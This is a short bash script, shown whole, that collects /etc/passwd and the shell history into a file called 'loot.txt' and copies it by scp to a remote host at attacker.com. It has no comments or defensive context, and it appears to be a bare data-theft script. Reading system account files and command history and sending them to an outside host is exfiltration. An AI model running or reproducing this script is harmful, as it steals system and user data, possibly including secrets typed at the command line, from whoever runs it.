#!/bin/bash
cat /etc/passwd > loot.txt
history >> loot.txt
scp loot.txt you@attacker.com:/tmp/
